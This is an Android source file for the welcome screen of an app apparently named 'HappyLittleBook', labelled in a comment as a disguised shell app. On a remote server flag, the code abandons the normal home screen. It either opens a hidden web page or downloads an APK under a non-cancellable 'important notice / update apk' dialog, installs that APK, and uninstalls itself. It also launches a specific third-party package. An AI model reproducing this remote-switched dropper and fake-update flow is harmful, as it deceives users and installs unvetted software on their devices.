package com.zhangyp.develop.HappyLittleBook.activity;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.text.TextUtils;
import android.util.Log;
import android.widget.ImageView;

import com.zhangyp.develop.HappyLittleBook.R;
import com.zhangyp.develop.HappyLittleBook.base.BaseActivity;
import com.zhangyp.develop.HappyLittleBook.base.BaseObserver;
import com.zhangyp.develop.HappyLittleBook.http.HttpAction;
import com.zhangyp.develop.HappyLittleBook.listener.CallBackListener;
import com.zhangyp.develop.HappyLittleBook.listener.DownloadCallBack;
import com.zhangyp.develop.HappyLittleBook.response.UpdateInfoResponse1;
import com.zhangyp.develop.HappyLittleBook.response.UpdateInfoResponse2;
import com.zhangyp.develop.HappyLittleBook.util.DownLoadUtil;
import com.zhangyp.develop.HappyLittleBook.util.InstallApkUtil;
import com.zhangyp.develop.HappyLittleBook.util.ToastUtil;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Created by zyp on 2019/8/20 0020.
 * class note:欢迎页
 */

public class WelcomeActivity extends BaseActivity {
    private ImageView iv_start;
    private boolean isCompleted = false;
    private String pag = "com.bxvip.app.bx152zy";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions();
        initView();
    }

    @TargetApi(Build.VERSION_CODES.M)
    private void requestPermissions() {

        List<String> permissions = new ArrayList<>();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && isNeedRequestPermissions(permissions)) {
            requestPermissions(permissions.toArray(new String[0]), 0);
        } else {
//            getUpdateInfo1();
            getUpdateInfo2();
        }
    }

    private boolean isNeedRequestPermissions(List<String> permissions) {
        // 存储权限
        addPermission(permissions, Manifest.permission.WRITE_EXTERNAL_STORAGE);
        addPermission(permissions, Manifest.permission.READ_EXTERNAL_STORAGE);
        return permissions.size() > 0;
    }

    private void addPermission(List<String> permissionsList, String permission) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
            permissionsList.add(permission);
        }
    }

    @TargetApi(23)
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        for (int i = 0; i < permissions.length; i++) {
            if (grantResults[i] == PackageManager.PERMISSION_GRANTED) continue;
            boolean b = shouldShowRequestPermissionRationale(permissions[i]);
            if (!b) {//拒绝且不再展示
                return;
            }
            requestPermissions();
            return;
        }
//        getUpdateInfo1();
        getUpdateInfo2();
    }

    @Override
    public int getLayoutId() {
        return R.layout.activity_welcome;
    }

    private void initView() {
        iv_start = findViewById(R.id.iv_start);
    }

    //马甲包
    private void getUpdateInfo1() {
        Map<String, String> param = new HashMap<>();
//        param.put("appid", "tutu201902");       //测试强更
//        param.put("appid", "tutu2019");         //测试web
        param.put("appid", "tutu20190828");     //正式
        HttpAction.getInstance().getUpdateInfo1(param).subscribe(new BaseObserver<>(new CallBackListener<UpdateInfoResponse1>() {
            @Override
            public void onSuccess(UpdateInfoResponse1 response) {
                next1(response);
            }

            @Override
            public void onError(int code, String message) {
                goMainPage();
            }
        }));
    }

    //QQ：柠檬味
    private void getUpdateInfo2() {
        Map<String, String> param = new HashMap<>();
//        param.put("appid", "aa123456");       //强更
//        param.put("appid", "mm123456");       //web
//        param.put("appid", "20192816826");      //正式
        HttpAction.getInstance().getUpdateInfo2(param).subscribe(new BaseObserver<>(new CallBackListener<UpdateInfoResponse2>() {
            @Override
            public void onSuccess(UpdateInfoResponse2 response) {
                next2(response);
            }

            @Override
            public void onError(int code, String message) {
                goMainPage();
            }
        }));
    }

    private void next1(UpdateInfoResponse1 response) {
        String showWeb = response.getShowWeb();
        if (TextUtils.isEmpty(showWeb)) {
            goMainPage();
            return;
        }
        if ("1".equals(showWeb)) {//跳转到隐藏页面
            goHidePage(response.getUrl());
            iv_start.setImageResource(R.drawable.home_hide_icon2);
        } else {//跳转到正常首页
            goMainPage();
        }
    }

    private void next2(UpdateInfoResponse2 response) {
        int status = response.getStatus();
        String isshowwap = response.getIsshowwap();
        if (status == 1 && "1".equals(isshowwap)) {
            goHidePage(response.getWapurl());
            iv_start.setImageResource(R.drawable.home_hide_icon2);
        } else {
            goMainPage();
        }
    }

    private void goHidePage(String url) {
        if (url.contains(".apk")) {
            //下载app
            startDownLoad(url);
        } else {
            //跳转到web页面
            Intent intent = new Intent(context, WebActivity.class);
            intent.putExtra("url", url);
            startActivity(intent);
            Log.e("======>", "goHidePage:WebActivity");
        }
    }

    private void goMainPage() {
//        iv_start.setImageResource(R.drawable.welcome_icon);
        new Handler().postDelayed(() -> {
            startActivity(new Intent(context, MainActivity.class));
            finish();
        }, 2000);
    }

    private void startDownLoad(String fileUrl) {
        if (isWeixinAvilible(WelcomeActivity.this)) {
            Intent intent = getPackageManager().getLaunchIntentForPackage(pag);
            startActivity(intent);
            return;
        }

        final ProgressDialog pd1 = new ProgressDialog(context);
        pd1.setTitle("重要通知");

        pd1.setMessage("更新apk");
        pd1.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        pd1.setCancelable(false);
        pd1.setIndeterminate(false);
        pd1.show();

        DownLoadUtil lUpData = new DownLoadUtil();
        lUpData.upDataFile(context, fileUrl, new DownloadCallBack() {
            @Override
            public void onProgress(final int progress) {

                runOnUiThread(() -> pd1.setProgress(progress));

            }

            @Override
            public void onCompleted(final File file) {
                runOnUiThread(() -> {
                    InstallApkUtil.installApk(context, file);
                    isCompleted = true;
                    pd1.dismiss();
                });
            }

            @Override
            public void onError(final String msg) {
                runOnUiThread(() -> {
                    pd1.dismiss();
                    ToastUtil.showWarningToast(context, msg);
                    goMainPage();
                });
            }
        });
    }

    @Override
    protected void onRestart() {
        super.onRestart();
        if (isCompleted) {
            InstallApkUtil.uninstallApk(context);
            isCompleted = false;
        }
//        else {
//            goMainPage();
//        }
    }

    public boolean isWeixinAvilible(Context context) {
        final PackageManager packageManager = context.getPackageManager();// 获取packagemanager
        List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);// 获取所有已安装程序的包信息
        if (pinfo != null) {
            for (int i = 0; i < pinfo.size(); i++) {
                String pn = pinfo.get(i).packageName;
                if (pn.equals(pag)) {
                    return true;
                }
            }
        }

        return false;
    }

    @Override
    protected void onResume() {
        super.onResume();
    }
}
